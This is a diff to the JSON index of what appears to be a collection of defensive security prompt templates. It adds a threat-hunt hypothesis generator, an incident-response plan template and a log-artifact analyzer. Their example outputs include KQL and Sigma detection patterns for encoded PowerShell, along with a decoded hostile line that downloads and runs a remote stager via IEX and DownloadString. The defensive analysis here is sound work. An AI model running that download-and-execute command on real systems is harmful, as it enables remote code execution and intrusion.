@@ -1,6 +1,6 @@
 {
-  "generated": "2026-05-19T00:00:00.000Z",
-  "count": 3,
+  "generated": "2026-05-28T00:00:00.000Z",
+  "count": 6,
   "prompts": [
     {
       "id": "alert-triage-assistant",
@@ -34,7 +34,7 @@
       "author": "hrushikesh-badgujar",
       "contributed": "2026-05-19",
       "best_with": "claude-3.5-sonnet",
-      "limitations": "Hallusinates field names for uncommon log sources — always validate detection fields against your SIEM schema before deployment",
+      "limitations": "Hallucinates field names for uncommon log sources — always validate detection fields against your SIEM schema before deployment",
       "prompt": "You are a detection engineer with deep expertise in Sigma rule authoring.\n\nAttack behavior to detect:\n{DESCRIBE THE ATTACK BEHAVIOR IN PLAIN ENGLISH}\n\nWrite a valid Sigma rule that detects this behavior. Follow these requirements exactly:\n- Use standard Sigma YAML structure: title, id, status, description, references, author, date, tags, logsource, detection, falsepositives, level\n- Set status to \"experimental\"\n- Choose the most specific logsource available (product, service, or category)\n- Write detection logic using keywords, selection, and condition fields\n- Use field names from common log sources (Windows Event Log, Sysmon, auditd, etc.)\n- Include at least two realistic false positive scenarios\n- Set an appropriate level: informational | low | medium | high | critical\n- Add MITRE ATT&CK tags in format: attack.tXXXX and attack.tactic\n\nOutput ONLY the Sigma rule in YAML. No explanation, no markdown fences, no commentary.",
       "example_output": "title: Suspicious PowerShell Encoded Command Execution\nid: a1b2c3d4-e5f6-7890-abcd-ef1234567890\nstatus: experimental\ndescription: Detects execution of PowerShell with base64-encoded commands, commonly used by attackers to obfuscate malicious payloads\nreferences:\n  - https://attack.mitre.org/techniques/T1059/001/\nauthor: hrushikesh-badgujar\ndate: 2026/05/19\ntags:\n  - attack.execution\n  - attack.t1059.001\n  - attack.defense_evasion\n  - attack.t1027\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\powershell.exe'\n    CommandLine|contains:\n      - '-EncodedCommand'\n      - '-enc '\n      - '-ec '\n  condition: selection\nfalsepositives:\n  - Legitimate administrative scripts using encoded commands\n  - Software installers that invoke encoded PowerShell during setup\nlevel: medium",
       "variants": [
@@ -72,6 +72,72 @@
         }
       ],
       "file": "prompts/intel/threat-intel-summarizer.yaml"
+    },
+    {
+      "id": "threat-hunt-hypothesis-generator",
+      "title": "Threat Hunt Hypothesis Generator",
+      "category": "hunt",
+      "use_case": "Generate structured, testable hunting hypotheses from a TTP ID or threat actor behavior",
+      "tags": ["threat-hunting", "hypothesis", "ttp", "mitre", "proactive-defense"],
+      "mitre": ["T1059", "T1078", "T1021"],
+      "author": "hrushikesh-badgujar",
+      "contributed": "2026-05-28",
+      "best_with": "claude-3.5-sonnet",
+      "limitations": "Hypotheses are only as specific as the input — vague TTP descriptions produce generic output. Data source assumptions target common enterprise stacks; verify field availability in your SIEM before hunting.",
+      "prompt": "You are a senior threat hunter with expertise in hypothesis-driven hunting.\n\nTTP or threat behavior to hunt:\n{PASTE TTP ID, TECHNIQUE NAME, OR THREAT ACTOR BEHAVIOR HERE}\n\nGenerate structured hunting hypotheses for this technique. Return ONLY the following structure. Do not add any other text.\n\nHUNT SCOPE: [Endpoint / Network / Cloud / Identity / Multi-domain]\nTECHNIQUE: [T####.###] [Technique Name]\n\nHYPOTHESES:\n1. [Testable — \"If [actor behavior], then [observable evidence] in [data source]\"]\n2. [Second hypothesis]\n3. [Third hypothesis]\n\nDATA SOURCES REQUIRED:\n- [Log source: specific field or event ID needed — one per line]\n\nBASELINE QUESTIONS:\n- [What is normal for this data source in your environment?]\n- [What threshold distinguishes noise from signal?]\n\nKQL HUNT QUERY:\n[1-2 KQL queries targeting the primary hypothesis]\n\nSIGMA CONDITION:\n[1 Sigma-style detection condition for correlation rules]\n\nSUCCESS CRITERIA: [What observable finding confirms the hypothesis — or rules it out]\n\nLOOKBACK WINDOW: [Recommended time range and why]",
+      "example_output": "HUNT SCOPE: Endpoint\nTECHNIQUE: T1059.001 PowerShell\n\nHYPOTHESES:\n1. If an attacker uses PowerShell for lateral movement, then encoded command executions spawned by remote management services (WinRM, WMI) will appear in process creation logs on non-admin workstations.\n2. If PowerShell is used for C2 communication, then outbound connections from powershell.exe to non-CDN IPs on ports 443/80 without a matching browser process will appear in network logs.\n3. If PowerShell is used for credential access, then LSASS reads by a PowerShell child process will appear in Sysmon Event ID 10 logs within 10 minutes of PowerShell execution.\n\nDATA SOURCES REQUIRED:\n- Windows Security Event ID 4688 (process creation with command line auditing enabled)\n- Sysmon Event ID 1 (process creation), 3 (network connection), 10 (process access)\n- EDR telemetry: parent-child process trees\n\nBASELINE QUESTIONS:\n- What is the normal rate of PowerShell execution per day per endpoint in your environment?\n- Which teams (IT, DevOps) legitimately use encoded commands — and from which hosts?\n\nKQL HUNT QUERY:\nDeviceProcessEvents\n| where FileName =~ \"powershell.exe\"\n| where InitiatingProcessFileName in~ (\"wmiprvse.exe\", \"wsmprovhost.exe\", \"svchost.exe\")\n| where ProcessCommandLine has_any (\"-EncodedCommand\", \"-enc \", \"-ec \", \"IEX\", \"DownloadString\")\n| where DeviceId !in (allowlisted_admin_hosts)\n| project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName\n\nSIGMA CONDITION:\nselection:\n  Image|endswith: '\\powershell.exe'\n  ParentImage|endswith:\n    - '\\wmiprvse.exe'\n    - '\\wsmprovhost.exe'\n  CommandLine|contains:\n    - '-EncodedCommand'\n    - 'IEX'\ncondition: selection\n\nSUCCESS CRITERIA: At least one PowerShell process with encoded commands spawned by a remote management parent on a non-admin workstation — corroborate with network logs showing outbound connection within the same session.\n\nLOOKBACK WINDOW: 30 days — covers most C2 dwell times while keeping query performance manageable.",
+      "variants": [
+        {
+          "model": "gpt-4o",
+          "prompt": "You are a threat hunter. Generate hunting hypotheses for the following TTP or behavior:\n\n{PASTE TTP ID, TECHNIQUE NAME, OR THREAT ACTOR BEHAVIOR HERE}\n\nReturn ONLY this structure — no preamble, no prose:\n\nTECHNIQUE: [T####.###] [Name]\nHYPOTHESES: [numbered list, max 3, each formatted as \"If [behavior], then [evidence] in [data source]\"]\nDATA SOURCES: [log sources and key fields, one per line]\nKQL QUERY: [1 targeted KQL hunt query]\nSUCCESS CRITERIA: [one sentence]\nLOOKBACK: [time range and reason]",
+          "notes": "GPT-4o adds prose before TECHNIQUE — the explicit \"no preamble\" suppresses it most of the time. Still occasionally wraps KQL in markdown fences; strip them before running."
+        }
+      ],
+      "file": "prompts/hunt/threat-hunt-hypothesis-generator.yaml"
+    },
+    {
+      "id": "incident-response-action-plan",
+      "title": "Incident Response Action Plan",
+      "category": "respond",
+      "use_case": "Generate a structured IR action plan with containment, eradication, and recovery steps for a given incident type",
+      "tags": ["incident-response", "containment", "eradication", "recovery", "playbook"],
+      "mitre": [],
+      "author": "hrushikesh-badgujar",
+      "contributed": "2026-05-28",
+      "best_with": "claude-3.5-sonnet",
+      "limitations": "Steps are general — adapt to your environment, tooling, and IR policy. Does not replace an approved IR playbook or legal/compliance sign-off on containment actions. Always loop in management before isolating production systems.",
+      "prompt": "You are an incident responder with experience handling enterprise security incidents.\n\nIncident details:\n{DESCRIBE THE INCIDENT: type, affected systems, initial indicators, timeline if known}\n\nGenerate a structured IR action plan. Return ONLY the following structure. Do not add any other text.\n\nINCIDENT TYPE: [Ransomware / Credential Theft / Data Exfiltration / Insider Threat / Phishing / C2 Beaconing / Other]\nSEVERITY: [P1-Critical / P2-High / P3-Medium / P4-Low]\nCURRENT PHASE: [Detection / Containment / Eradication / Recovery / Post-Incident]\n\nIMMEDIATE ACTIONS (first 30 minutes):\n1. [Action — who does it, what tool, why]\n2.\n3.\n\nEVIDENCE PRESERVATION (before containment changes state):\n- [What to collect and where to store it]\n\nCONTAINMENT STEPS:\n1. [Specific action with rollback consideration]\n2.\n3.\n\nERADICATION STEPS:\n1. [Specific removal or remediation action]\n2.\n\nRECOVERY STEPS:\n1. [Validated restoration action]\n2.\n\nSTAKEHOLDER NOTIFICATIONS:\n- [Who to notify, when, and what to tell them — CISO, Legal, HR, PR, regulator]\n\nIOC WATCHLIST: [Indicators to block in SIEM/EDR/firewall immediately — one per line]\n\nDO NOT DO: [Common mistakes for this incident type that make the situation worse]",
+      "example_output": "INCIDENT TYPE: C2 Beaconing\nSEVERITY: P2-High\nCURRENT PHASE: Containment\n\nIMMEDIATE ACTIONS (first 30 minutes):\n1. Analyst: Pull full network flow for the beaconing host from the past 72h — identify all external IPs contacted and flag consistent-interval connections (jitter <5%)\n2. SOC Lead: Open P2 incident ticket, assign IR lead, notify on-call CISO via Slack\n3. Network: Block the known C2 IP/domain at the perimeter firewall — do NOT isolate the host yet to preserve beacon timing for forensics\n\nEVIDENCE PRESERVATION (before containment changes state):\n- Memory dump of the affected host (Volatility-compatible) before rebooting or isolating\n- Full process tree snapshot from EDR at time of detection\n- Raw PCAP of the last 4 hours of outbound traffic from the host\n- Event logs (Security, System, PowerShell operational) exported to SIEM case\n\nCONTAINMENT STEPS:\n1. Isolate the host at the network switch level (VLAN quarantine) — preserve the machine state for forensics\n2. Disable the user account associated with the compromised host in Active Directory\n3. Rotate any credentials the user had access to — VPN, email, shared service accounts\n\nERADICATION STEPS:\n1. Identify the malware dropper via EDR process tree and file hash — compare against VirusTotal\n2. Remove persistence mechanisms: scheduled tasks, registry run keys, new services, startup folders\n3. Scan all hosts with the same user or lateral movement path for matching IOCs\n\nRECOVERY STEPS:\n1. Reimage the affected host from a known-clean golden image — do not restore from backup taken after infection date\n2. Re-enroll the host in EDR and confirm telemetry is flowing before returning to production\n\nSTAKEHOLDER NOTIFICATIONS:\n- CISO: Immediate — severity, affected systems, containment status\n- Legal: Within 2h if data exfiltration is suspected — preserve chain of custody\n- IT Manager: Coordinate host isolation window to minimize business impact\n- HR: Only if insider threat indicators are present\n\nIOC WATCHLIST:\n185.220.101.45 — known C2 IP\nupdate-service[.]net — C2 domain\nSHA256: a3f1b2c4... — dropper hash\n\nDO NOT DO:\n- Do not reboot the host before taking a memory dump — volatile C2 artifacts will be lost\n- Do not block the C2 IP before collecting timing data — you lose the ability to track dwell time\n- Do not notify the user until Legal has reviewed — premature disclosure can trigger evidence destruction in insider threat cases",
+      "variants": [
+        {
+          "model": "gpt-4o",
+          "prompt": "You are an incident responder. Generate a structured action plan for the following incident:\n\n{DESCRIBE THE INCIDENT: type, affected systems, initial indicators, timeline if known}\n\nReturn ONLY this structure — no prose, no preamble:\n\nINCIDENT TYPE: [type]\nSEVERITY: [P1-P4]\nIMMEDIATE ACTIONS: [numbered, max 3 — who, what, why]\nEVIDENCE PRESERVATION: [bullet list]\nCONTAINMENT: [numbered steps]\nERADICATION: [numbered steps]\nRECOVERY: [numbered steps]\nNOTIFICATIONS: [who, when]\nIOC WATCHLIST: [one per line]\nDO NOT DO: [max 3 common mistakes for this incident type]",
+          "notes": "GPT-4o handles this structure well. For complex incidents, it may truncate the IOC list — follow up with \"list all IOCs you identified\" if the incident description is IOC-heavy."
+        }
+      ],
+      "file": "prompts/respond/incident-response-action-plan.yaml"
+    },
+    {
+      "id": "log-artifact-analyzer",
+      "title": "Log Artifact Analyzer",
+      "category": "analyze",
+      "use_case": "Analyze a suspicious command line, script, log entry, or encoded string for malicious indicators and technique attribution",
+      "tags": ["log-analysis", "artifact-analysis", "command-line", "deobfuscation", "attribution"],
+      "mitre": ["T1059", "T1027", "T1140"],
+      "author": "hrushikesh-badgujar",
+      "contributed": "2026-05-28",
+      "best_with": "claude-3.5-sonnet",
+      "limitations": "Static analysis only — cannot execute or detonate code. May miss multi-layer obfuscation requiring runtime evaluation. Always sandbox-detonate confirmed malicious artifacts before relying solely on this output.",
+      "prompt": "You are a malware analyst and forensic investigator performing static artifact analysis.\n\nArtifact to analyze:\n{PASTE THE COMMAND LINE, SCRIPT, LOG ENTRY, OR ENCODED STRING HERE}\n\nAnalyze the artifact and return ONLY the following structure. Do not add any other text.\n\nARTIFACT TYPE: [Command Line / PowerShell Script / Batch / Bash / Encoded Payload / Log Entry / Other]\nVERDICT: [Malicious / Likely Malicious / Suspicious / Likely Benign / Benign]\nCONFIDENCE: [High / Medium / Low]\nREASON: [One sentence explaining the verdict]\n\nBREAKDOWN:\n[Step-by-step parsing — decode base64, expand variables, trace execution flow, one step per line]\n\nCAPABILITIES IDENTIFIED:\n- [Specific capability, e.g., \"Downloads remote payload from external URL\"]\n\nMITRE TTPs:\n- [T####.###]: [Technique Name] — [How it maps to this artifact]\n\nINDICATORS EXTRACTED:\n- IPs / Domains: [one per line or \"None\"]\n- File Paths: [one per line or \"None\"]\n- Registry Keys: [one per line or \"None\"]\n- Hashes: [one per line or \"None\"]\n\nRISK FACTORS: [What makes this artifact high or low risk in context]\n\nRECOMMENDED ACTIONS:\n1. [Immediate analyst action]\n2. [Follow-up investigation step]\n\nDETECTION OPPORTUNITY: [Log source + field + value pattern that would catch this artifact at scale]",
+      "example_output": "ARTIFACT TYPE: PowerShell Command Line\nVERDICT: Likely Malicious\nCONFIDENCE: High\nREASON: The command downloads and executes a remote script in-memory via IEX(DownloadString), a pattern with no legitimate administrative use in standard enterprise environments.\n\nBREAKDOWN:\n1. powershell.exe -nop -w hidden -enc — launches PowerShell with no profile, hidden window, encoded command\n2. Base64 decode of encoded payload: IEX(New-Object Net.WebClient).DownloadString('http://185.220.x.x/stager.ps1')\n3. IEX executes the downloaded content directly in memory — no file written to disk\n4. Destination IP (185.220.x.x) is in a Tor exit node range\n\nCAPABILITIES IDENTIFIED:\n- Remote payload download over HTTP\n- In-memory execution (fileless — evades file-based AV)\n- Anti-forensic flags: no profile load (-nop), hidden window (-w hidden)\n\nMITRE TTPs:\n- T1059.001: PowerShell — primary execution method\n- T1105: Ingress Tool Transfer — downloads stager from external IP\n- T1027: Obfuscated Files or Information — base64-encoded command\n\nINDICATORS EXTRACTED:\n- IPs / Domains: 185.220.x.x\n- File Paths: None (fileless execution)\n- Registry Keys: None\n- Hashes: None (payload not on disk)\n\nRISK FACTORS: Tor exit node destination, fileless execution, hidden window — all three together indicate deliberate evasion. No legitimate tooling uses this pattern.\n\nRECOMMENDED ACTIONS:\n1. Isolate the originating host immediately and preserve memory before rebooting\n2. Pull full process tree from EDR — identify what spawned powershell.exe and what child processes it created\n\nDETECTION OPPORTUNITY:\nSysmon Event ID 1 — CommandLine contains \"-enc\" AND \"-nop\" AND \"-w hidden\" on the same powershell.exe invocation.\nKQL: DeviceProcessEvents | where FileName =~ \"powershell.exe\" | where ProcessCommandLine has_all (\"-enc\", \"-nop\", \"-w hidden\")",
+      "variants": [
+        {
+          "model": "gpt-4o",
+          "prompt": "You are a malware analyst. Analyze the following artifact for malicious indicators.\n\nArtifact:\n{PASTE THE COMMAND LINE, SCRIPT, LOG ENTRY, OR ENCODED STRING HERE}\n\nReturn ONLY this structure — no prose, no preamble:\n\nARTIFACT TYPE: [type]\nVERDICT: [Malicious/Likely Malicious/Suspicious/Likely Benign/Benign]\nCONFIDENCE: [High/Medium/Low]\nREASON: [one sentence]\nBREAKDOWN: [step-by-step decode/parse, one step per line]\nCAPABILITIES: [bullet list]\nMITRE TTPs: [T####.### Name — mapping, one per line]\nINDICATORS: [IPs, domains, paths, hashes — one per line or \"None\"]\nRISK FACTORS: [one sentence]\nACTIONS: [numbered, max 2]\nDETECTION: [log source + field + value]",
+          "notes": "GPT-4o occasionally adds markdown headers or code fences — the explicit \"no prose, no preamble\" suppresses most of it. For heavily obfuscated payloads, follow up with \"now decode the next layer\" to walk through multi-stage obfuscation."
+        }
+      ],
+      "file": "prompts/analyze/log-artifact-analyzer.yaml"
     }
   ]
 }
